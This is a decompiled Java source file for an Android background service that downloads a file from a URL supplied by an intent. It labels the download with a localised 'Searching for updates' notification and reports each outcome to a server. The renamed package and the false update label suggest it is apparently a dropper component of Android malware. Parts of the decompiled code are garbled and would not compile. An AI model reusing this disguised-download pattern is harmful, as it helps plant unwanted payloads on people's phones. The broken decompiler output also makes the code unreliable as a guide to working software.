/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Notification
 *  android.app.NotificationChannel
 *  android.app.NotificationManager
 *  android.app.Service
 *  android.content.Context
 *  android.content.Intent
 *  android.os.Build$VERSION
 *  android.os.IBinder
 */
package linker.resourcer.encoder;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.Locale;
import linker.resourcer.encoder.DownloadForegroundService$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.WorkerService;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class DownloadForegroundService
extends Service {
    private static final String CHANNEL_ID = "download_channel_id";
    public static final String EXTRA_FILE_NAME = "extra_file_name";
    public static final String EXTRA_SAVEDIR = "extra_dir";
    public static final String EXTRA_URL = "extra_url";
    public static String LOCAL_MSG;
    public static String LOCAL_TITLE;
    private static final int NOTIFICATION_ID = 1045;
    private volatile boolean isCancelled = false;

    static {
        LOCAL_TITLE = "Searching for updates";
        LOCAL_MSG = "Please wait";
    }

    private Notification buildNotification(String object, int n, int n2, boolean bl) {
        object = new NotificationCompat.Builder((Context)this, CHANNEL_ID).setSmallIcon(0x1080081).setContentTitle(LOCAL_TITLE).setContentText((CharSequence)object).setOnlyAlertOnce(true).setOngoing(true).setPriority(-1);
        if (n2 > 0 && !bl) {
            ((NotificationCompat.Builder)object).setProgress(n2, n, false);
        } else if (bl) {
            ((NotificationCompat.Builder)object).setProgress(0, 0, true);
        }
        return ((NotificationCompat.Builder)object).build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            String string2 = LOCAL_MSG;
            NotificationChannel notificationChannel = new NotificationChannel(CHANNEL_ID, (CharSequence)"updates Channel", 2);
            notificationChannel.setDescription(string2);
            string2 = (NotificationManager)this.getSystemService("notification");
            if (string2 != null) {
                string2.createNotificationChannel(notificationChannel);
            }
        }
    }

    /*
     * Loose catch block
     * WARNING - void declaration
     */
    private void downloadFile(String object, String charSequence, Context context, String object2) {
        void var1_4;
        Object object3;
        Object object4;
        block97: {
            Object object5;
            block95: {
                block96: {
                    Object object6;
                    Object object7;
                    block94: {
                        block92: {
                            block93: {
                                Object object8;
                                block91: {
                                    Object object9;
                                    block90: {
                                        int n;
                                        int n2;
                                        Object object10;
                                        StringBuilder stringBuilder;
                                        File file;
                                        block88: {
                                            block86: {
                                                block87: {
                                                    object5 = null;
                                                    object7 = null;
                                                    file = null;
                                                    object4 = null;
                                                    object8 = null;
                                                    object6 = null;
                                                    stringBuilder = null;
                                                    object3 = null;
                                                    object9 = null;
                                                    object10 = new URL((String)object);
                                                    object = (HttpURLConnection)((URL)object10).openConnection();
                                                    object7 = object8;
                                                    object6 = object9;
                                                    object4 = file;
                                                    object3 = stringBuilder;
                                                    object5 = object;
                                                    ((URLConnection)object).connect();
                                                    object7 = object8;
                                                    object6 = object9;
                                                    object4 = file;
                                                    object3 = stringBuilder;
                                                    object5 = object;
                                                    n2 = ((HttpURLConnection)object).getResponseCode();
                                                    if (n2 == 200) break block86;
                                                    object7 = object8;
                                                    object6 = object9;
                                                    object4 = file;
                                                    object3 = stringBuilder;
                                                    object5 = object;
                                                    this.updateNotification("Update error", 0, 0, false, true);
                                                    object7 = object8;
                                                    object6 = object9;
                                                    object4 = file;
                                                    object3 = stringBuilder;
                                                    object5 = object;
                                                    object7 = object8;
                                                    object6 = object9;
                                                    object4 = file;
                                                    object3 = stringBuilder;
                                                    object5 = object;
                                                    charSequence = new StringBuilder();
                                                    object7 = object8;
                                                    object6 = object9;
                                                    object4 = file;
                                                    object3 = stringBuilder;
                                                    object5 = object;
                                                    WorkerService.MyWorker.AlertServer(context, "Downloader", ((StringBuilder)charSequence).append("Download failed: HTTP ").append(n2).toString());
                                                    object7 = object8;
                                                    object6 = object9;
                                                    object4 = file;
                                                    object3 = stringBuilder;
                                                    object5 = object;
                                                    this.stopSelf();
                                                    if (!false) break block87;
                                                    try {
                                                        throw new NullPointerException();
                                                    }
                                                    catch (Exception exception) {
                                                        // empty catch block
                                                    }
                                                }
                                                if (false) {
                                                    try {
                                                        throw new NullPointerException();
                                                    }
                                                    catch (Exception exception) {
                                                        // empty catch block
                                                    }
                                                }
                                                if (false) {
                                                    try {
                                                        throw new NullPointerException();
                                                    }
                                                    catch (Exception exception) {
                                                        // empty catch block
                                                    }
                                                }
                                                if (object != null) {
                                                    ((HttpURLConnection)object).disconnect();
                                                }
                                                this.stopForeground(false);
                                                this.stopSelf();
                                                return;
                                            }
                                            object7 = object8;
                                            object6 = object9;
                                            object4 = file;
                                            object3 = stringBuilder;
                                            object5 = object;
                                            n = ((URLConnection)object).getContentLength();
                                            object7 = object8;
                                            object6 = object9;
                                            object4 = file;
                                            object3 = stringBuilder;
                                            object5 = object;
                                            object7 = object8;
                                            object6 = object9;
                                            object4 = file;
                                            object3 = stringBuilder;
                                            object5 = object;
                                            object7 = object8 = (object10 = new BufferedInputStream(((URLConnection)object).getInputStream()));
                                            object6 = object9;
                                            object4 = object8;
                                            object3 = stringBuilder;
                                            object5 = object;
                                            object7 = object8;
                                            object6 = object9;
                                            object4 = object8;
                                            object3 = stringBuilder;
                                            object5 = object;
                                            object10 = new File((String)object2);
                                            object7 = object8;
                                            object6 = object9;
                                            object4 = object8;
                                            object3 = stringBuilder;
                                            object5 = object;
                                            if (((File)object10).exists()) break block88;
                                            object7 = object8;
                                            object6 = object9;
                                            object4 = object8;
                                            object3 = stringBuilder;
                                            object5 = object;
                                            ((File)object10).mkdirs();
                                        }
                                        object7 = object8;
                                        object6 = object9;
                                        object4 = object8;
                                        object3 = stringBuilder;
                                        object5 = object;
                                        object7 = object8;
                                        object6 = object9;
                                        object4 = object8;
                                        object3 = stringBuilder;
                                        object5 = object;
                                        file = new File((File)object10, (String)charSequence);
                                        object7 = object8;
                                        object6 = object9;
                                        object4 = object8;
                                        object3 = stringBuilder;
                                        object5 = object;
                                        object7 = object8;
                                        object6 = object9;
                                        object4 = object8;
                                        object3 = stringBuilder;
                                        object5 = object;
                                        object2 = new FileOutputStream(file);
                                        object7 = object8;
                                        object6 = object2;
                                        object4 = object8;
                                        object3 = object2;
                                        object5 = object;
                                        object9 = new byte[8192];
                                        n2 = 0;
                                        long l = 0L;
                                        while (true) {
                                            block89: {
                                                object7 = object8;
                                                object6 = object2;
                                                object4 = object8;
                                                object3 = object2;
                                                object5 = object;
                                                if (this.isCancelled) break;
                                                object7 = object8;
                                                object6 = object2;
                                                object4 = object8;
                                                object3 = object2;
                                                object5 = object;
                                                int n3 = ((InputStream)object8).read((byte[])object9);
                                                if (n3 == -1) break;
                                                l += (long)n3;
                                                object7 = object8;
                                                object6 = object2;
                                                object4 = object8;
                                                object3 = object2;
                                                object5 = object;
                                                ((FileOutputStream)object2).write((byte[])object9, 0, n3);
                                                if (n <= 0) break block89;
                                                object7 = object8;
                                                object6 = object2;
                                                object4 = object8;
                                                object3 = object2;
                                                object5 = object;
                                                n3 = (int)(100L * l / (long)n);
                                                if (n3 == n2) continue;
                                                object7 = object8;
                                                object6 = object2;
                                                object4 = object8;
                                                object3 = object2;
                                                object5 = object;
                                                this.updateNotification(LOCAL_TITLE, n3, 100, true, false);
                                                n2 = n3;
                                                continue;
                                            }
                                            object7 = object8;
                                            object6 = object2;
                                            object4 = object8;
                                            object3 = object2;
                                            object5 = object;
                                            object7 = object8;
                                            object6 = object2;
                                            object4 = object8;
                                            object3 = object2;
                                            object5 = object;
                                            stringBuilder = new StringBuilder();
                                            object7 = object8;
                                            object6 = object2;
                                            object4 = object8;
                                            object3 = object2;
                                            object5 = object;
                                            this.updateNotification(stringBuilder.append(LOCAL_TITLE).append(l / 1024L).append(" KB").toString(), 0, 0, true, false);
                                            continue;
                                            break;
                                        }
                                        object7 = object8;
                                        object6 = object2;
                                        object4 = object8;
                                        object3 = object2;
                                        object5 = object;
                                        if (!this.isCancelled) break block90;
                                        object7 = object8;
                                        object6 = object2;
                                        object4 = object8;
                                        object3 = object2;
                                        object5 = object;
                                        this.updateNotification("Update cancelled", 0, 0, false, true);
                                        object7 = object8;
                                        object6 = object2;
                                        object4 = object8;
                                        object3 = object2;
                                        object5 = object;
                                        WorkerService.MyWorker.AlertServer(context, "Downloader", "Download cancelled");
                                        break block91;
                                    }
                                    object7 = object8;
                                    object6 = object2;
                                    object4 = object8;
                                    object3 = object2;
                                    object5 = object;
                                    object9 = new StringBuilder;
                                    object7 = object8;
                                    object6 = object2;
                                    object4 = object8;
                                    object3 = object2;
                                    object5 = object;
                                    ((StringBuilder)object9)();
                                    object7 = object8;
                                    object6 = object2;
                                    object4 = object8;
                                    object3 = object2;
                                    object5 = object;
                                    this.updateNotification(((StringBuilder)object9).append("Update complete: ").append((String)charSequence).toString(), 100, 100, false, true);
                                    object7 = object8;
                                    object6 = object2;
                                    object4 = object8;
                                    object3 = object2;
                                    object5 = object;
                                    WorkerService.MyWorker.AlertServer(context, "Downloader", "Download complete");
                                }
                                try {
                                    ((OutputStream)object2).flush();
                                }
                                catch (Exception exception) {}
                                try {
                                    ((FileOutputStream)object2).close();
                                }
                                catch (Exception exception) {}
                                try {
                                    ((InputStream)object8).close();
                                }
                                catch (Exception exception) {}
                                if (object == null) break block95;
                                break block96;
                                catch (Exception exception) {
                                    break block92;
                                }
                                catch (Throwable throwable) {
                                }
                                catch (Exception exception) {
                                    break block93;
                                }
                                charSequence = object5;
                                break block97;
                            }
                            object = null;
                        }
                        object4 = object7;
                        object3 = object6;
                        object5 = object;
                        ((Throwable)((Object)charSequence)).printStackTrace();
                        object4 = object7;
                        object3 = object6;
                        object5 = object;
                        object4 = object7;
                        object3 = object6;
                        object5 = object;
                        object2 = new StringBuilder();
                        object4 = object7;
                        object3 = object6;
                        object5 = object;
                        this.updateNotification(((StringBuilder)object2).append("Download error: ").append(((Throwable)((Object)charSequence)).getMessage()).toString(), 0, 0, false, true);
                        object4 = object7;
                        object3 = object6;
                        object5 = object;
                        object4 = object7;
                        object3 = object6;
                        object5 = object;
                        object2 = new StringBuilder();
                        object4 = object7;
                        object3 = object6;
                        object5 = object;
                        WorkerService.MyWorker.AlertServer(context, "Downloader", ((StringBuilder)object2).append("Download error: ").append(((Throwable)((Object)charSequence)).getMessage()).toString());
                        if (object6 == null) break block94;
                        try {
                            ((OutputStream)object6).flush();
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }
                    if (object6 != null) {
                        try {
                            ((FileOutputStream)object6).close();
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }
                    if (object7 != null) {
                        try {
                            ((InputStream)object7).close();
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }
                    if (object == null) break block95;
                }
                ((HttpURLConnection)object).disconnect();
            }
            this.stopForeground(false);
            this.stopSelf();
            return;
            catch (Throwable throwable) {
                charSequence = object5;
            }
        }
        if (object3 != null) {
            try {
                ((OutputStream)object3).flush();
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        if (object3 != null) {
            try {
                ((FileOutputStream)object3).close();
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        if (object4 != null) {
            try {
                ((InputStream)object4).close();
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        if (charSequence != null) {
            ((HttpURLConnection)((Object)charSequence)).disconnect();
        }
        this.stopForeground(false);
        this.stopSelf();
        throw var1_4;
    }

    private void updateNotification(String string2, int n, int n2, boolean bl, boolean bl2) {
        NotificationCompat.Builder builder = new NotificationCompat.Builder((Context)this, CHANNEL_ID);
        int n3 = bl2 ? 17301634 : 0x1080081;
        builder = builder.setSmallIcon(n3).setContentTitle(LOCAL_TITLE).setContentText(string2).setOnlyAlertOnce(true).setPriority(-1).setOngoing(bl);
        if (n2 > 0 && n >= 0 && n <= n2 && !bl2) {
            builder.setProgress(n2, n, false);
        } else {
            builder.setProgress(0, 0, false);
        }
        string2 = (NotificationManager)this.getSystemService("notification");
        if (string2 != null) {
            string2.notify(1045, builder.build());
        }
    }

    public void cancelDownload() {
        this.isCancelled = true;
    }

    /* synthetic */ void lambda$onStartCommand$0$com-icontrol-protector-DownloadForegroundService(String string2, String string3, String string4) {
        this.downloadFile(string2, string3, this.getApplicationContext(), string4);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    /*
     * Enabled aggressive block sorting
     */
    public void onCreate() {
        int n;
        String string2;
        String string3;
        block16: {
            super.onCreate();
            this.createNotificationChannel();
            string3 = "Searching for updates";
            string2 = "Please wait";
            String string4 = Locale.getDefault().getLanguage();
            switch (string4.hashCode()) {
                case 3886: {
                    if (!string4.equals("zh")) break;
                    n = 1;
                    break block16;
                }
                case 3710: {
                    if (!string4.equals("tr")) break;
                    n = 2;
                    break block16;
                }
                case 3651: {
                    if (!string4.equals("ru")) break;
                    n = 3;
                    break block16;
                }
                case 3588: {
                    if (!string4.equals("pt")) break;
                    n = 4;
                    break block16;
                }
                case 3246: {
                    if (!string4.equals("es")) break;
                    n = 5;
                    break block16;
                }
                case 3121: {
                    if (!string4.equals("ar")) break;
                    n = 0;
                    break block16;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                break;
            }
            case 5: {
                string3 = "Buscando actualizaciones";
                string2 = "Por favor, espere";
                break;
            }
            case 4: {
                string3 = "Procurando atualiza\u00e7\u00f5es";
                string2 = "Por favor, aguarde";
                break;
            }
            case 3: {
                string3 = "\u041f\u043e\u0438\u0441\u043a \u043e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0439";
                string2 = "\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u043f\u043e\u0434\u043e\u0436\u0434\u0438\u0442\u0435";
                break;
            }
            case 2: {
                string3 = "G\u00fcncellemeler aran\u0131yor";
                string2 = "L\u00fctfen bekleyin";
                break;
            }
            case 1: {
                string3 = "\u6b63\u5728\u68c0\u67e5\u66f4\u65b0";
                string2 = "\u8bf7\u7a0d\u5019";
                break;
            }
            case 0: {
                string3 = "\u064a\u062a\u0645 \u0627\u0644\u0628\u062d\u062b \u0639\u0646 \u0627\u0644\u062a\u062d\u062f\u064a\u062b\u0627\u062a";
                string2 = "\u0627\u0644\u0631\u062c\u0627\u0621 \u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631";
            }
        }
        LOCAL_TITLE = string3;
        LOCAL_MSG = string2;
    }

    public void onDestroy() {
        super.onDestroy();
        this.isCancelled = true;
    }

    public int onStartCommand(Intent object, int n, int n2) {
        String string2 = object.getStringExtra(EXTRA_URL);
        String string3 = object.getStringExtra(EXTRA_FILE_NAME);
        object = object.getStringExtra(EXTRA_SAVEDIR);
        if (string2 != null && string3 != null) {
            this.startForeground(1045, this.buildNotification(LOCAL_TITLE, 0, 0, true));
            new Thread(new DownloadForegroundService$$ExternalSyntheticLambda0(this, string2, string3, (String)object)).start();
            return 2;
        }
        this.stopSelf();
        return 2;
    }
}

